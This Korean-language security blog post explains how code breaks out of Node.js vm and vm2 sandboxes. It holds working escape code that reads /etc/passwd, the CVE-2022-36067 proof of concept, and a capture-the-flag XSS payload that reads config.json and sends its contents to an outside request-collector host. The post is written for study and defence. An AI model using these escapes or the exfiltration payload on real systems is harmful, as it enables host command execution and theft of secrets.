---
layout: post
title:  "Nodejs VM Sandbox Breakout"
author: "Yoobi"
comments: true
tags: [node.js]
---

라온화이트햇 핵심연구2팀 유병일


23년 1월에 진행된 [IrisCTF 2023 [web] metacalc](https://velog.io/@yoobi/IrisCTF-2023-web-metacalc) 문제를 공부하면서 학습한 nodejs VM Sandbox Breakout에 대한 포스팅입니다. 

# What is nodejs VM?

nodejs의 VM 모듈은 무엇일까요? VM 모듈은 nodejs 어플리케이션 내부에 가상머신 컨텍스트로 스크립트를 실행하는 환경을 제공합니다. 주요 장점 중 하나는 보다 안전한 환경에서 신뢰되지 않은 코드(Untrusted Code)를 실행하게 만들 수 있다는 점입니다. VM 모듈은 가상머신 내 샌드박스 환경으로 코드를 실행시켜 실제 호스트 시스템과 메인 스크립트에는 접근하는 위험을 선제적으로 방어할 수 있습니다.

아래는 간단한 코드를 VM 모듈 없이 구현한 예제와 VM 모듈을 사용하여 구현한 예제입니다.

```jsx
// normal.js
"user strict";

console.log(1+1);

console.log(process.mainModule.require('child_process').execSync('cat /etc/passwd').toString());
```

![Untitled](/assets/2023-03-29/Untitled.png)

```jsx

// vm.js
"use strict";
const vm = require("vm");

var tmp = vm.runInNewContext(`1+1`);
console.log(tmp);

tmp = vm.runInNewContext(`process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()`);
console.log(tmp);
```

![Untitled](/assets/2023-03-29/Untitled 1.png)

VM 모듈을 사용하면 `process is not defined` 에러 메세지를 확인할 수 있습니다. 이와 같이 생성된 가성머신 내에서 스크립트를 실행하고 호스트 시스템에 대한 접근을 제한하고 있는 것을 확인할 수 있습니다.

따라서, 어플리케이션의 특정 코드에서 커맨드 인젝션 취약점이 발생하더라도 VM 환경에서 동작하고 있다면 호스트 시스템에 대한 명령어 실행을 제한할 수 있습니다.

이러한 환경을 샌드박스(Sandbox)라고 합니다.

# How to breakout nodejs VM Sandbox?

그렇다면 이러한 환경에서는 호스트 시스템에 대한 접근이 불가능한 것일까요?

아래 코드를 보면 원래 접근할 수 없었던 nodejs 내부의 process에 VM 환경임에도 접근이 가능한 것을 확인할 수 있습니다.

```jsx
// process.js
"user strict";

console.log(process);
```

![Untitled](/assets/2023-03-29/Untitled 2.png)

```jsx
// vm_process.js
"use strict";
const vm = require("vm");

var tmp = vm.runInNewContext(`this.constructor.constructor("return process")()`);
console.log(tmp);
```

![Untitled](/assets/2023-03-29/Untitled 3.png)

직접적으로 process에 접근하는 것은 불가능하나, `this.constructor.constructor("return process")()`를 통해 VM code 외부의 constructor에 접근하고 해당 constructor의 process를 리턴하여 강제로 VM 환경 내에서도 process에 대한 접근을 가능하게 만듭니다.

여기서 this.~로 constructor에 접근이 가능한 이유는 해당 어플리케이션이 실행되면서 이미 VM context 외부에서 지정된 객체이기 때문입니다.

즉, VM 모듈 내의 `this.constructor.constructor("return process")()` 은 VM 모듈 외의 `process` 이므로 VM 모듈 외의 공격 스크립트를 그대로 작성하면 호스트 시스템 명령어 실행이 가능합니다.

```jsx
// outside of VM
process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()
// inside of VM
this.constructor.constructor("return process")().mainModule.require('child_process').execSync('cat /etc/passwd').toString()
```

```jsx
//vm1.js
"use strict";
const vm = require("vm");

var tmp = vm.runInNewContext(`this.constructor.constructor("return process")().mainModule.require('child_process').execSync('cat /etc/passwd').toString()`);
console.log(tmp);
```

![Untitled](/assets/2023-03-29/Untitled 4.png)

커맨드 인젝션이 가능함을 확인했음에도 불구하고 시스템 명령어 실행이 불가능할 시, 해당 코드를 실행하는 부분을 잘 체크하고 에러코드 등을 확인하여 VM 환경 내에서 동작하는 스크립트라면 위의 방법을 통해 샌드박스 Breakout을 시도해볼 수 있습니다.

간혹, CTF 문제에서는 VM 모듈의 취약점을 활용하여 출제자의 의도와는 unintended 풀이로 빠르게 FLAG를 획득할 수 있는 상황도 존재합니다.

아래는 WolvCTF 2023의 Zombie 301, 401 문제 풀이와 unintended 풀이입니다

![Untitled](/assets/2023-03-29/Untitled 5.png)

문제에서 사용중인 zombie module에서 VM 모듈을 사용하고 있고 저희의 입력 값을 VM.runInContext()로 실행시켜주는 환경이었기 때문에 바로 익스플로잇이 가능하였습니다.

```jsx
https://zombie-401-tlejfksioa-ul.a.run.app/zombie?show=<script>location="https://dslhtie.request.dreamhack.games/?x="+this.constructor.constructor("return process.mainModule.require('child_process').execSync('cat ./config.json')")()</script>

https://zombie-401-tlejfksioa-ul.a.run.app/zombie?show=%3Cscript%3Elocation%3D%22https%3A%2F%2Fdslhtie.request.dreamhack.games%2F%3Fx%3D%22%2Bthis.constructor.constructor%28%22return%20process.mainModule.require%28%27child_process%27%29.execSync%28%27cat%20.%2Fconfig.json%27%29%22%29%28%29%3C%2Fscript%3E
```

참고) IrisCTF 2023 [web] metacalc 문제 풀이

[IrisCTF 2023-web-metacalc](https://velog.io/@yoobi/IrisCTF-2023-web-metacalc)

# Upgraded to Sandbox VM2

![Untitled](/assets/2023-03-29/Untitled 6.png)

![Untitled](/assets/2023-03-29/Untitled 7.png)

VM2은 nodejs 코어 모듈 VM에 보안성을 추가하여 제공하는 모듈입니다. 현재도 꾸준히 다양한 우회 기법들을 적극적으로 제보받고 빠르게 보안 패치를 진행하고 있습니다. 대부분의 Security fix는 샌드박스 환경을 breakout하는 취약점에 대한 패치입니다. CHANGELOG를 통해 짧은 시간 동안에도 반복적으로 익스플로잇&패치되고 있는 것을 확인할 수 있습니다.

```jsx
v3.9.11 (2022-08-28)
[fix] Security fix.

v3.9.10 (2022-07-05)
[fix] Security fix.

v3.9.6 (2022-02-08)
[fix] Security fixes (XmiliaH)

v3.9.4 (2021-10-12)
[fix] Security fixes (XmiliaH)

v3.9.3 (2020-04-07)
[fix] Security fixes

v3.8.4 (2019-09-13)
[fix] Security fixes (XmiliaH)

v3.8.3 (2019-07-31)
[fix] Security fixes

v3.8.0 (2019-04-21)
[fix] Security fixes

v3.6.11 (2019-04-08)
[fix] Security fixes

v3.6.10 (2019-01-28)
[fix] Security fixes

v3.6.9 (2019-01-26)
[fix] Security fixes

v3.6.8 (2019-01-26)
[fix] Security fixes

v3.6.7 (2019-01-26)
[fix] Security fixes

v3.6.6 (2019-01-01)
[fix] Security fixes

v3.6.5 (2018-12-31)
[fix] Security fixes

v3.6.3 (2018-08-06)
[fix] Security fixes

v3.6.2 (2018-07-05)
[fix] Security fixes

v3.6.1 (2018-06-27)
[fix] Security fixes

v3.0.1 (2016-07-20)
Initial release
```

그 중에서도 가장 최근에 Oxeye 연구팀에서 발견한 CVE-2022-36067(<3.9.11)을 분석해보도록 하겠습니다.

우선 아래는 CVE-2022-36067의 POC 입니다.

```jsx
let vm = require("vm2");
let v = new vm.VM();

v.run(`
        globalThis.OldError=globalThis.Error;
        try{
                const a=123;
                a=44;
        }catch(err){
                console.log(err)
        }
        globalThis.Error={};
        globalThis.Error.prepareStackTrace=(errStr,traces)=>{
                traces[0].getThis().process.mainModule.require('child_process').execSync('cat /etc/passwd > /tmp/pwned');
        }
        const {stack}=new globalThis.OldError;
`)
```

VM 모듈의 익스플로잇 예제처럼 `this.constructor.constructor("return process")()`를 통한 process 접근은 더 이상 불가능합니다.

낮은 버전의 VM2에서 주로 `try {} catch {}`를 이용한 Exception의 constructor 호출이 우회기법으로 자주 사용되었고 다양한 방식으로 Exception을 발생시키는 형태로 공격이 진행되었습니다.

아래는 과거 낮은 버전에서의 익스플로잇 예제입니다.

```jsx
// vm2_low_version_ex.js
const {NodeVM} = require('vm2'); 
nvm = new NodeVM()

nvm.run(`
    try {
        this.process.removeListener(); 
    } 
    catch (host_exception) {
        console.log('host exception: ' + host_exception.toString());
        host_constructor = host_exception.constructor.constructor;
        host_process = host_constructor('return this')().process;
				child_process = host_process.mainModule.require("child_process");
				console.log(child_process.execSync("cat /etc/passwd").toString());
    }
`);
```

CVE-2022-36067에서는 에러를 발생 시킨 뒤 globalThis.Error.prepareStackTrace, 즉 Error.prepareStackTrace를 통해 불러온 not sandboxed 객체를 활용하였습니다.

![Untitled](/assets/2023-03-29/Untitled 8.png)

`Error.prepareStackTrace`에 `(err, traces) ⇒ { return stack }` 와 같은 형태로 넣어주면 CallSite 객체의 배열에 대한 접근이 가능합니다. 그 중에서 `getThis()`를 사용하여 샌드박스 환경 밖에 있는 객체를 지정하여 process에 바로 접근하였습니다. 그 결과 `traces[0].getThis().process.mainModule.require('child_process').execSync('cat /etc/passwd > /tmp/pwned');`를 통해 시스템 명령어를 실행할 수 있습니다.

![Untitled](/assets/2023-03-29/Untitled 9.png)

여기까지 nodejs 환경의 코어 모듈 VM 그리고 VM2에 대해서 알아보았습니다. VM 모듈의 취약성을 VM2에서 다양하게 방어 조치하고 있기 때문에 VM을 바로 사용하지 않고, VM2을 사용하는 것이 상대적으로 안전할 것입니다.

또한, VM2도 지속적으로 다양하게 방식으로 Breakout이 시도 중이기 때문에 버전 업데이트를 꾸준히 확인하여 적용할 필요가 있습니다.

Refer

[https://www.npmjs.com/package/vm-nodejs](https://www.npmjs.com/package/vm-nodejs)

[https://www.npmjs.com/package/vm2](https://www.npmjs.com/package/vm2)

[https://www.geeksforgeeks.org/what-are-the-use-cases-for-the-node-js-vm-core-module/](https://www.geeksforgeeks.org/what-are-the-use-cases-for-the-node-js-vm-core-module/)

[https://thegoodhacker.com/posts/the-unsecure-node-vm-module/](https://thegoodhacker.com/posts/the-unsecure-node-vm-module/)

[https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html](https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html)

[https://blog.idagio.com/testing-express-js-with-node-vm-63a344075052](https://blog.idagio.com/testing-express-js-with-node-vm-63a344075052)

[https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)

[https://github.com/patriksimek/vm2/security/advisories/GHSA-mrgp-mrhc-5jrq](https://github.com/patriksimek/vm2/security/advisories/GHSA-mrgp-mrhc-5jrq)

[https://lannstark.github.io/nodejs/stacktrace/1](https://lannstark.github.io/nodejs/stacktrace/1)